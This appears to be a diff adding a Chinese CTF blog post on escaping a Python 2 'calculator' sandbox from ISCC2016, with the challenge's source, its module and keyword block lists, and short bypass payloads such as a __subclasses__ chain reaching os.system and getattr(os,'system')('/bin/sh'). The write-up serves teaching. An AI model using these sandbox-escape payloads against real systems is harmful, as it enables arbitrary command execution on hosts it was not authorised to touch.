@@ -224,7 +224,250 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"></div>
+      <div class="body-wrap"><article id="post-python命令行执行系统命令" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/06/08/python命令行执行系统命令/" class="article-date">
+      <time datetime="2016-06-08T22:40:11.000Z" itemprop="datePublished">2016-06-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      python沙盒绕过
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>来源于ISCC2016的一题pwn题目，nc连上去后发现是一个python shell，当时思路错了，死脑筋的认为这一定是一个python反序列化漏洞，然后各种搜集资料，ORZ。<br>好吧，这其实是一个导入shell模块，命令执行拿flag的姿势。</p>
+<p>2017.7.8更新：改名为python沙盒绕过，增加沙盒绕过的各种姿势。</p>
+ <a id="more"></a>
+<h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h3><p>python中导入模块有以下几种方式</p>
+<ol>
+<li><code>import xxx</code></li>
+<li><code>from xxx import *</code></li>
+<li><code>__import__(&#39;xxx&#39;)</code><br><strong>程序把前两种都禁用了，而第三种却没有禁用。</strong></li>
+</ol>
+<h3 id="shell模块"><a href="#shell模块" class="headerlink" title="shell模块"></a>shell模块</h3><p>python中shell模块有以下几种</p>
+<ol>
+<li><code>os.system() os.popen()</code></li>
+<li><code>commands.getstatusoutput() commands.getoutput()</code></li>
+<li><code>commands.getstatus()</code></li>
+<li><code>subprocess.call(command, shell=True) subprocess.Popen(command, shell=True)</code></li>
+<li><code>pty.spawn()</code></li>
+</ol>
+<h3 id="附上pwn脚本"><a href="#附上pwn脚本" class="headerlink" title="附上pwn脚本"></a>附上pwn脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"============================================="</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"   Simple calculator implemented by python   "</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"============================================="</span></div><div class="line">    <span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getexp</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> raw_input(<span class="string">"&gt;&gt;&gt; "</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_import_</span><span class="params">(name, *args, **kwargs)</span>:</span></div><div class="line">    module_blacklist = [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'time'</span>, <span class="string">'bdb'</span>, <span class="string">'bsddb'</span>, <span class="string">'cgi'</span>, </div><div class="line">            <span class="string">'CGIHTTPServer'</span>, <span class="string">'cgitb'</span>, <span class="string">'compileall'</span>, <span class="string">'ctypes'</span>, <span class="string">'dircache'</span>,</div><div class="line">            <span class="string">'doctest'</span>, <span class="string">'dumbdbm'</span>, <span class="string">'filecmp'</span>, <span class="string">'fileinput'</span>, <span class="string">'ftplib'</span>, <span class="string">'gzip'</span>,</div><div class="line">            <span class="string">'getopt'</span>, <span class="string">'getpass'</span>, <span class="string">'gettext'</span>, <span class="string">'httplib'</span>, <span class="string">'importlib'</span>, <span class="string">'imputil'</span>, </div><div class="line">            <span class="string">'linecache'</span>, <span class="string">'macpath'</span>, <span class="string">'mailbox'</span>, <span class="string">'mailcap'</span>, <span class="string">'mhlib'</span>, <span class="string">'mimetools'</span>,</div><div class="line">            <span class="string">'mimetypes'</span>, <span class="string">'modulefinder'</span>, <span class="string">'multiprocessing'</span>, <span class="string">'netrc'</span>, <span class="string">'new'</span>,</div><div class="line">            <span class="string">'optparse'</span>, <span class="string">'pdb'</span>, <span class="string">'pipes'</span>, <span class="string">'pkgutil'</span>, <span class="string">'platform'</span>, <span class="string">'popen2'</span>, <span class="string">'poplib'</span>,</div><div class="line">            <span class="string">'posix'</span>, <span class="string">'posixfile'</span>, <span class="string">'profile'</span>, <span class="string">'pstats'</span>, <span class="string">'pty'</span>, <span class="string">'py_compile'</span>,</div><div class="line">            <span class="string">'pyclbr'</span>, <span class="string">'pydoc'</span>, <span class="string">'rexec'</span>, <span class="string">'runpy'</span>, <span class="string">'shlex'</span>, <span class="string">'shutil'</span>, <span class="string">'SimpleHTTPServer'</span>,</div><div class="line">            <span class="string">'SimpleXMLRPCServer'</span>, <span class="string">'site'</span>, <span class="string">'smtpd'</span>, <span class="string">'socket'</span>, <span class="string">'SocketServer'</span>,</div><div class="line">            <span class="string">'subprocess'</span>, <span class="string">'sysconfig'</span>, <span class="string">'tabnanny'</span>, <span class="string">'tarfile'</span>, <span class="string">'telnetlib'</span>,</div><div class="line">            <span class="string">'tempfile'</span>, <span class="string">'Tix'</span>, <span class="string">'trace'</span>, <span class="string">'turtle'</span>, <span class="string">'urllib'</span>, <span class="string">'urllib2'</span>,</div><div class="line">            <span class="string">'user'</span>, <span class="string">'uu'</span>, <span class="string">'webbrowser'</span>, <span class="string">'whichdb'</span>, <span class="string">'zipfile'</span>, <span class="string">'zipimport'</span>]</div><div class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</div><div class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don't let user import these modules</span></div><div class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">'No you can\' import &#123;0&#125;!!!'</span>.format(forbid))</div><div class="line">    <span class="keyword">return</span> __import__(name, *args, **kwargs)    <span class="comment"># normal modules can be imported</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sandbox_filter</span><span class="params">(command)</span>:</span></div><div class="line">    blacklist = [<span class="string">'exec'</span>, <span class="string">'sh'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__setitem__'</span>, <span class="string">'='</span>, <span class="string">'open'</span>, <span class="string">'read'</span>, <span class="string">'sys'</span>, <span class="string">';'</span>, <span class="string">'os'</span>]</div><div class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> blacklist:</div><div class="line">        <span class="keyword">if</span> forbid <span class="keyword">in</span> command:   <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    <span class="keyword">return</span> <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sandbox_exec</span><span class="params">(command)</span>:</span>      <span class="comment"># sandbox user input</span></div><div class="line">    result = <span class="number">0</span></div><div class="line">    __sandboxed_builtins__ = dict(__builtins__.__dict__)</div><div class="line">    __sandboxed_builtins__[<span class="string">'__import__'</span>] = _hook_import_    <span class="comment"># hook import</span></div><div class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">'open'</span>]</div><div class="line">    _global = &#123;</div><div class="line">        <span class="string">'__builtins__'</span> : __sandboxed_builtins__</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> sandbox_filter(command) == <span class="number">0</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'Malicious user input detected!!!'</span></div><div class="line">        exit(<span class="number">0</span>)</div><div class="line">    command = <span class="string">'result = '</span> + command</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">exec</span> command <span class="keyword">in</span> _global     <span class="comment"># do calculate in a sandboxed environment</span></div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">print</span> e</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    result = _global[<span class="string">'result'</span>]  <span class="comment"># extract the result</span></div><div class="line">    <span class="keyword">return</span> result</div><div class="line"></div><div class="line">banner()</div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    command = getexp()</div><div class="line">    <span class="keyword">print</span> sandbox_exec(command)</div></pre></td></tr></table></figure>
+<h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><p>python内置函数沙盒绕过姿势</p>
+<p><code>[c for c in [].__class__.__base__.__subclasses__() if c.__name__ == &#39;catch_warnings&#39;][0].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;echo Hello SandBox&#39;)</code></p>
+<p>getattr绕过</p>
+<p>getattr(os,”system”)(“/bin/sh”)</p>
+
+      
+      
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+            <div class="shang_tit">
+              <p>你要赏我吃糖果吗？</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+            </div>
+              <div class="pay_explain">扫码打赏，你说多少就多少</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝" /></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信" /></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="//cdn.bootcss.com/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/06/08/python命令行执行系统命令/">python沙盒绕过</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 WinterSun 的个人博客">WinterSun</a></p>
+        <p><span>发布时间:</span>2016年06月08日 - 15时40分</p>
+        <p><span>最后更新:</span>2017年07月08日 - 08时48分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/06/08/python命令行执行系统命令/" title="python沙盒绕过">https://winter3un.github.io/2016/06/08/python命令行执行系统命令/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://winter3un.github.io/2016/06/08/python命令行执行系统命令/　　作者: WinterSun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2016/06/08/wargame-pwnable-bf/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          [wargame-pwnable] bf
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/06/20/CCF2016/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">【CFF2016-pwn】 Writeup</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#背景"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#导入模块"><span class="toc-number">2.</span> <span class="toc-text">导入模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell模块"><span class="toc-number">3.</span> <span class="toc-text">shell模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#附上pwn脚本"><span class="toc-number">4.</span> <span class="toc-text">附上pwn脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#other"><span class="toc-number">5.</span> <span class="toc-text">other</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/06/08/wargame-pwnable-bf/" title="上一篇: [wargame-pwnable] bf">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2016/06/20/CCF2016/" title="下一篇: 【CFF2016-pwn】 Writeup">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/07/09/rsa-ctf/">CTF-RSA破解方式整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/09/2018-706-wp/">2018 706 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/19/ddctf-2018/">DDCTF-2018  WEB WRITEUP</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/2018-n1ctf/">n1ctf 2018 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/20/2018-2-21/">低版本php+nginx 解析漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/29/cve-2017-office/">对cve-2017-0199与cve-2017-8759的浅析</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/16/2017-8-10/">810线下赛复盘</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/10/2017-8-9/">8月9日个人赛总结 && writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/17/jarvisoj-web/">【web】jarvis oj 刷题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/04/heap-all/">【pwn】cuit2017 & 0ctf2017 heap总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/03/墨色的五月/">墨色的五月</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/27/2017-429-final/">【pwn】2017-429final</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/22/429-2017/">【pwn】2017-429预赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/10/arm-double-free-attack/">arm_double_free_attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/09/初探pwntools-fmt特性/">【pwn】 初探pwntools fmt特性</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/how-to-get-libc/">how_to_get_libc</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/T3CTF2017/">【pwn】T3CTF2017 堆溢出以及return to  dl slove</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/07/ARM-overflow/">ARM环境下栈溢出攻击初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/06/fastbin-attack/">fastbin attack 利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/FILE结构体的溢出利用【FSP】/">FILE结构体的溢出利用【FSP】</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/05/xdctf2016-wp/">XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/19/C-S-WeChat/">C/S-WeChat</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/18/杂记-2016-7-18/">杂记-2016-7-18</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/05/ICHUNQIU2016-PWN/">【ICQ2016】 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/20/CCF2016/">【CFF2016-pwn】 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/python命令行执行系统命令/">python沙盒绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/wargame-pwnable-bf/">[wargame-pwnable] bf</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/2015-问鼎杯线下PWN/">2015-问鼎杯线下PWN</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/【pwn】诡异的movsx和cdqe/">【pwn】诡异的movsx和cdqe</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/Auto-post/">Auto post</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/20/pwn-关于栈的迁移/">[pwn] 关于栈的迁移</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/19/hexo-build/">hexo build</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/18/mprotect/">mprotect 之痛</a></li></ul>
+    <script src="/live2d/js/jquery.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
       <footer id="footer">
     <div class="outer">
         <div id="footer-info">
